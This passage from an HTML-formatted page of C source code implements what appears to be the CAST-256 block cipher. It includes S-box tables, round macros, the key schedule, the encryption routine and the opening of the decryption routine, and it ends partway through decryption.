<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdcdef3c8, 0xd35fb171, 0x088a1bc8,
0xbec0c560, 0x61a3c9e8, 0xbca8f54d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc72feffa, 0x22822e99, 0x82c570b4,
0xd8d94e89, 0x8b1c34bc, 0x301e16e6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x273be979, 0xb0ffeaa6, 0x61d9b8c6,
0x00b24869, 0xb7ffce3f, 0x08dc283b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x43daf65a, 0xf7e19798, 0x7619b72f,
0x8f1c9ba4, 0xdc8637a0, 0x16a7d3b1,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x9fc393b7, 0xa7136eeb, 0xc6bcc63e,
0x1a513742, 0xef6828bc, 0x520365d6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x2d6a77ab, 0x3527ed4b, 0x821fd216,
0x095c6e2e, 0xdb92f2fb, 0x5eea29cb,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x145892f5, 0x91584f7f, 0x5483697b,
0x2667a8cc, 0x85196048, 0x8c4bacea,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x833860d4, 0x0d23e0f9, 0x6c387e8a,
0x0ae6d249, 0xb284600c, 0xd835731d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdcb1c647, 0xac4c56ea, 0x3ebd81b3,
0x230eabb0, 0x6438bc87, 0xf0b5b1fa,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8f5ea2b3, 0xfc184642, 0x0a036b7a,
0x4fb089bd, 0x649da589, 0xa345415e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x5c038323, 0x3e5d3bb9, 0x43d79572,
0x7e6dd07c, 0x06dfdf1e, 0x6c6cc4ef,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x7160a539, 0x73bfbe70, 0x83877605,
0x4523ecf1</font>
<br><font color="#3333FF">&nbsp; },</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8defc240, 0x25fa5d9f, 0xeb903dbf,
0xe810c907, 0x47607fff, 0x369fe44b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8c1fc644, 0xaececa90, 0xbeb1f9bf,
0xeefbcaea, 0xe8cf1950, 0x51df07ae,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x920e8806, 0xf0ad0548, 0xe13c8d83,
0x927010d5, 0x11107d9f, 0x07647db9,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb2e3e4d4, 0x3d4f285e, 0xb9afa820,
0xfade82e0, 0xa067268b, 0x8272792e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x553fb2c0, 0x489ae22b, 0xd4ef9794,
0x125e3fbc, 0x21fffcee, 0x825b1bfd,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x9255c5ed, 0x1257a240, 0x4e1a8302,
0xbae07fff, 0x528246e7, 0x8e57140e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x3373f7bf, 0x8c9f8188, 0xa6fc4ee8,
0xc982b5a5, 0xa8c01db7, 0x579fc264,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x67094f31, 0xf2bd3f5f, 0x40fff7c1,
0x1fb78dfc, 0x8e6bd2c1, 0x437be59b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x99b03dbf, 0xb5dbc64b, 0x638dc0e6,
0x55819d99, 0xa197c81c, 0x4a012d6e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc5884a28, 0xccc36f71, 0xb843c213,
0x6c0743f1, 0x8309893c, 0x0feddd5f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x2f7fe850, 0xd7c07f7e, 0x02507fbf,
0x5afb9a04, 0xa747d2d0, 0x1651192e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xaf70bf3e, 0x58c31380, 0x5f98302e,
0x727cc3c4, 0x0a0fb402, 0x0f7fef82,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8c96fdad, 0x5d2c2aae, 0x8ee99a49,
0x50da88b8, 0x8427f4a0, 0x1eac5790,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x796fb449, 0x8252dc15, 0xefbd7d9b,
0xa672597d, 0xada840d8, 0x45f54504,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xfa5d7403, 0xe83ec305, 0x4f91751a,
0x925669c2, 0x23efe941, 0xa903f12e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x60270df2, 0x0276e4b6, 0x94fd6574,
0x927985b2, 0x8276dbcb, 0x02778176,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf8af918d, 0x4e48f79e, 0x8f616ddf,
0xe29d840e, 0x842f7d83, 0x340ce5c8,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x96bbb682, 0x93b4b148, 0xef303cab,
0x984faf28, 0x779faf9b, 0x92dc560d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x224d1e20, 0x8437aa88, 0x7d29dc96,
0x2756d3dc, 0x8b907cee, 0xb51fd240,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xe7c07ce3, 0xe566b4a1, 0xc3e9615e,
0x3cf8209d, 0x6094d1e3, 0xcd9ca341,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x5c76460e, 0x00ea983b, 0xd4d67881,
0xfd47572c, 0xf76cedd9, 0xbda8229c,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x127dadaa, 0x438a074e, 0x1f97c090,
0x081bdb8a, 0x93a07ebe, 0xb938ca15,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x97b03cff, 0x3dc2c0f8, 0x8d1ab2ec,
0x64380e51, 0x68cc7bfb, 0xd90f2788,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x12490181, 0x5de5ffd4, 0xdd7ef86a,
0x76a2e214, 0xb9a40368, 0x925d958f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x4b39fffa, 0xba39aee9, 0xa4ffd30b,
0xfaf7933b, 0x6d498623, 0x193cbcfa,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x27627545, 0x825cf47a, 0x61bd8ba0,
0xd11e42d1, 0xcead04f4, 0x127ea392,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x10428db7, 0x8272a972, 0x9270c4a8,
0x127de50b, 0x285ba1c8, 0x3c62f44f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x35c0eaa5, 0xe805d231, 0x428929fb,
0xb4fcdf82, 0x4fb66a53, 0x0e7dc15b,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x1f081fab, 0x108618ae, 0xfcfd086d,
0xf9ff2889, 0x694bcc11, 0x236a5cae,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x12deca4d, 0x2c3f8cc5, 0xd2d02dfe,
0xf8ef5896, 0xe4cf52da, 0x95155b67,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x494a488c, 0xb9b6a80c, 0x5c8f82bc,
0x89d36b45, 0x3a609437, 0xec00c9a9,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x44715253, 0x0a874b49, 0xd773bc40,
0x7c34671c, 0x02717ef6, 0x4feb5536,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa2d02fff, 0xd2bf60c4, 0xd43f03c0,
0x50b4ef6d, 0x07478cd1, 0x006e1888,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa2e53f55, 0xb9e6d4bc, 0xa2048016,
0x97573833, 0xd7207d67, 0xde0f8f3d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x72f87b33, 0xabcc4f33, 0x7688c55d,
0x7b00a6b0, 0x947b0001, 0x570075d2,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf9bb88f8, 0x8942019e, 0x4264a5ff,
0x856302e0, 0x72dbd92b, 0xee971b69,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x6ea22fde, 0x5f08ae2b, 0xaf7a616d,
0xe5c98767, 0xcf1febd2, 0x61efc8c2,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf1ac2571, 0xcc8239c2, 0x67214cb8,
0xb1e583d1, 0xb7dc3e62, 0x7f10bdce,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf90a5c38, 0x0ff0443d, 0x606e6dc6,
0x60543a49, 0x5727c148, 0x2be98a1d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8ab41738, 0x20e1be24, 0xaf96da0f,
0x68458425, 0x99833be5, 0x600d457d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x282f9350, 0x8334b362, 0xd91d1120,
0x2b6d8da0, 0x642b1e31, 0x9c305a00,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x52bce688, 0x1b03588a, 0xf7baefd5,
0x4142ed9c, 0xa4315c11, 0x83323ec5,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdfef4636, 0xa133c501, 0xe9d3531c,
0xee353783</font>
<br><font color="#3333FF">&nbsp; },</font>
<br><font color="#3333FF">&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x9db30420, 0x1fb6e9de, 0xa7be7bef,
0xd273a298, 0x4a4f7bdb, 0x64ad8c57,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x85510443, 0xfa020ed1, 0x7e287aff,
0xe60fb663, 0x095f35a1, 0x79ebf120,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xfd059d43, 0x6497b7b1, 0xf3641f63,
0x241e4adf, 0x28147f5f, 0x4fa2b8cd,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc9430040, 0x0cc32220, 0xfdd30b30,
0xc0a5374f, 0x1d2d00d9, 0x24147b15,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xee4d111a, 0x0fca5167, 0x71ff904c,
0x2d195ffe, 0x1a05645f, 0x0c13fefe,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x081b08ca, 0x05170121, 0x80530100,
0xe83e5efe, 0xac9af4f8, 0x7fe72701,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd2b8ee5f, 0x06df4261, 0xbb9e9b8a,
0x7293ea25, 0xce84ffdf, 0xf5718801,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x3dd64b04, 0xa26f263b, 0x7ed48400,
0x547eebe6, 0x446d4ca0, 0x6cf3d6f5,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x2649abdf, 0xaea0c7f5, 0x36338cc1,
0x503f7e93, 0xd3772061, 0x11b638e1,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x72500e03, 0xf80eb2bb, 0xabe0502e,
0xec8d77de, 0x57971e81, 0xe14f6746,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc9335400, 0x6920318f, 0x081dbb99,
0xffc304a5, 0x4d351805, 0x7f3d5ce3,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa6c866c6, 0x5d5bcca9, 0xdaec6fea,
0x9f926f91, 0x9f46222f, 0x3991467d,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa5bf6d8e, 0x1143c44f, 0x43958302,
0xd0214eeb, 0x022083b8, 0x3fb6180c,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x18f8931e, 0x281658e6, 0x26486e3e,
0x8bd78a70, 0x7477e4c1, 0xb506e07c,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf32d0a25, 0x79098b02, 0xe4eabb81,
0x28123b23, 0x69dead38, 0x1574ca16,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdf871b62, 0x211c40b7, 0xa51a9ef9,
0x0014377b, 0x041e8ac8, 0x09114003,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xbd59e4d2, 0xe3d156d5, 0x4fe876d5,
0x2f91a340, 0x557be8de, 0x00eae4a7,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x0ce5c2ec, 0x4db4bba6, 0xe756bdff,
0xdd3369ac, 0xec17b035, 0x06572327,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x99afc8b0, 0x56c8c391, 0x6b65811c,
0x5e146119, 0x6e85cb75, 0xbe07c002,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xc2325577, 0x893ff4ec, 0x5bbfc92d,
0xd0ec3b25, 0xb7801ab7, 0x8d6d3b24,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x20c763ef, 0xc366a5fc, 0x9c382880,
0x0ace3205, 0xaac9548a, 0xeca1d7c7,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x041afa32, 0x1d16625a, 0x6701902c,
0x9b757a54, 0x31d477f7, 0x9126b031,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x36cc6fdb, 0xc70b8b46, 0xd9e66a48,
0x56e55a79, 0x026a4ceb, 0x52437eff,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x2f8f76b4, 0x0df980a5, 0x8674cde3,
0xedda04eb, 0x17a9be04, 0x2c18f4df,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb7747f9d, 0xab2af7b4, 0xefc34d20,
0x2e096b7c, 0x1741a254, 0xe5b6a035,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x213d42f6, 0x2c1c7c26, 0x61c2f50f,
0x6552daf9, 0xd2c231f8, 0x25130f69,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd8167fa2, 0x0418f2c8, 0x001a96a6,
0x0d1526ab, 0x63315c21, 0x5e0a72ec,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x49bafefd, 0x187908d9, 0x8d0dbd86,
0x311170a7, 0x3e9b640c, 0xcc3e10d7,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd5cad3b6, 0x0caec388, 0xf73001e1,
0x6c728aff, 0x71eae2a1, 0x1f9af36e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xcfcbd12f, 0xc1de8417, 0xac07be6b,
0xcb44a1d8, 0x8b9b0f56, 0x013988c3,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb1c52fca, 0xb4be31cd, 0xd8782806,
0x12a3a4e2, 0x6f7de532, 0x58fd7eb6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd01ee900, 0x24adffc2, 0xf4990fc5,
0x9711aac5, 0x001d7b95, 0x82e5e7d2,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x109873f6, 0x00613096, 0xc32d9521,
0xada121ff, 0x29908415, 0x7fbb977f,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xaf9eb3db, 0x29c9ed2a, 0x5ce2a465,
0xa730f32c, 0xd0aa3fe8, 0x8a5cc091,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd49e2ce7, 0x0ce454a9, 0xd60acd86,
0x015f1919, 0x77079103, 0xdea03af6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x78a8565e, 0xdee356df, 0x21f05cbe,
0x8b75e387, 0xb3c50651, 0xb8a5c3ef,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xd8eeb6d2, 0xe523be77, 0xc2154529,
0x2f69efdf, 0xafe67afb, 0xf470c4b2,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xf3e0eb5b, 0xd6cc9876, 0x39e4460c,
0x1fda8538, 0x1987832f, 0xca007367,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xa99144f8, 0x296b299e, 0x492fc295,
0x9266beab, 0xb5676e69, 0x9bd3ddda,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xdf7e052f, 0xdb25701c, 0x1b5e51ee,
0xf65324e6, 0x6afce36c, 0x0316cc04,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x8644213e, 0xb7dc59d0, 0x7965291f,
0xccd6fd43, 0x41823979, 0x932bcdf6,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0xb657c34d, 0x4edfd282, 0x7ae5290c,
0x3cb9536b, 0x851e20fe, 0x9833557e,</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; 0x13ecf0b0, 0xd3ffb372, 0x3f85c5c1,
0x0aef7ed2</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">};</font>
<p><font color="#3333FF">#define f1(y,x,kr,km)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; t&nbsp; = rotl(km + x, kr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u&nbsp; = s_box[0][byte(t,3)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u ^= s_box[1][byte(t,2)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u -= s_box[2][byte(t,1)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u += s_box[3][byte(t,0)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; y ^= u</font>
<p><font color="#3333FF">#define f2(y,x,kr,km)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; t&nbsp; = rotl(km ^ x, kr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u&nbsp; = s_box[0][byte(t,3)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u -= s_box[1][byte(t,2)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u += s_box[2][byte(t,1)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u ^= s_box[3][byte(t,0)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; y ^= u</font>
<p><font color="#3333FF">#define f3(y,x,kr,km)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; t&nbsp; = rotl(km - x, kr);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u&nbsp; = s_box[0][byte(t,3)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u += s_box[1][byte(t,2)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u ^= s_box[2][byte(t,1)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; u -= s_box[3][byte(t,0)];&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; y ^= u</font>
<p><font color="#3333FF">#define f_rnd(x,n)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(x[2],x[3],l_key[n],&nbsp;&nbsp;&nbsp;
l_key[n + 4]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f2(x[1],x[2],l_key[n + 1],l_key[n
+ 5]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f3(x[0],x[1],l_key[n + 2],l_key[n
+ 6]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(x[3],x[0],l_key[n + 3],l_key[n
+ 7])</font>
<p><font color="#3333FF">#define i_rnd(x, n)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(x[3],x[0],l_key[n + 3],l_key[n
+ 7]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f3(x[0],x[1],l_key[n + 2],l_key[n
+ 6]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f2(x[1],x[2],l_key[n + 1],l_key[n
+ 5]);&nbsp;&nbsp;&nbsp; \</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(x[2],x[3],l_key[n],&nbsp;&nbsp;&nbsp;
l_key[n + 4])</font>
<p><font color="#3333FF">#define k_rnd(k,tr,tm)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(k[6],k[7],tr[0],tm[0]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f2(k[5],k[6],tr[1],tm[1]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f3(k[4],k[5],tr[2],tm[2]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(k[3],k[4],tr[3],tm[3]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f2(k[2],k[3],tr[4],tm[4]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f3(k[1],k[2],tr[5],tm[5]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f1(k[0],k[1],tr[6],tm[6]);&nbsp;
\</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; f2(k[7],k[0],tr[7],tm[7])</font>
<p><font color="#3333FF">u4byte l_key[96];</font>
<p><font color="#3333FF">u4byte *</font>
<br><font color="#3333FF">set_key (const u4byte in_key[], const u4byte
key_len)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; u4byte i, j, t, u, cm, cr, lk[8], tm[8],
tr[8];</font>
<p><font color="#3333FF">&nbsp; for (i = 0; i &lt; key_len / 32; ++i)</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp; lk[i] = io_swap (in_key[i]);</font>
<p><font color="#3333FF">&nbsp; for (; i &lt; 8; ++i)</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp; lk[i] = 0;</font>
<p><font color="#3333FF">&nbsp; cm = 0x5a827999;</font>
<br><font color="#3333FF">&nbsp; cr = 19;</font>
<p><font color="#3333FF">&nbsp; for (i = 0; i &lt; 96; i += 8)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (j = 0; j
&lt; 8; ++j)</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;&nbsp; tm[j] = cm;</font>
<br><font color="#3333FF">&nbsp;&nbsp; cm += 0x6ed9eba1;</font>
<br><font color="#3333FF">&nbsp;&nbsp; tr[j] = cr;</font>
<br><font color="#3333FF">&nbsp;&nbsp; cr += 17;</font>
<br><font color="#3333FF">&nbsp;}</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k_rnd (lk, tr,
tm);</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (j = 0; j &lt;
8; ++j)</font>
<br><font color="#3333FF">&nbsp;{</font>
<br><font color="#3333FF">&nbsp;&nbsp; tm[j] = cm;</font>
<br><font color="#3333FF">&nbsp;&nbsp; cm += 0x6ed9eba1;</font>
<br><font color="#3333FF">&nbsp;&nbsp; tr[j] = cr;</font>
<br><font color="#3333FF">&nbsp;&nbsp; cr += 17;</font>
<br><font color="#3333FF">&nbsp;}</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; k_rnd (lk, tr,
tm);</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 0] =
lk[0];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 1] =
lk[2];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 2] =
lk[4];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 3] =
lk[6];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 4] =
lk[7];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 5] =
lk[5];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 6] =
lk[3];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l_key[i + 7] =
lk[1];</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#3333FF">&nbsp; return l_key;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">aes_encrypt (const u4byte in_blk[4], u4byte out_blk[4])</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; u4byte t, u, blk[4];</font>
<p><font color="#3333FF">&nbsp; blk[0] = io_swap (in_blk[0]);</font>
<br><font color="#3333FF">&nbsp; blk[1] = io_swap (in_blk[1]);</font>
<br><font color="#3333FF">&nbsp; blk[2] = io_swap (in_blk[2]);</font>
<br><font color="#3333FF">&nbsp; blk[3] = io_swap (in_blk[3]);</font>
<p><font color="#3333FF">&nbsp; f_rnd (blk, 0);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 8);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 16);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 24);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 32);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 40);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 48);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 56);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 64);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 72);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 80);</font>
<br><font color="#3333FF">&nbsp; i_rnd (blk, 88);</font>
<p><font color="#3333FF">&nbsp; out_blk[0] = io_swap (blk[0]);</font>
<br><font color="#3333FF">&nbsp; out_blk[1] = io_swap (blk[1]);</font>
<br><font color="#3333FF">&nbsp; out_blk[2] = io_swap (blk[2]);</font>
<br><font color="#3333FF">&nbsp; out_blk[3] = io_swap (blk[3]);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void</font>
<br><font color="#3333FF">decrypt (const u4byte in_blk[4], u4byte out_blk[4])</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; u4byte t, u, blk[4];</font>
<p><font color="#3333FF">&nbsp; blk[0] = io_swap (in_blk[0]);</font>
<br><font color="#3333FF">&nbsp; blk[1] = io_swap (in_blk[1]);</font>
<br><font color="#3333FF">&nbsp; blk[2] = io_swap (in_blk[2]);</font>
<br><font color="#3333FF">&nbsp; blk[3] = io_swap (in_blk[3]);</font>
<p><font color="#3333FF">&nbsp; f_rnd (blk, 88);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 80);</font>
<br><font color="#3333FF">&nbsp; f_rnd (blk, 72);</font>
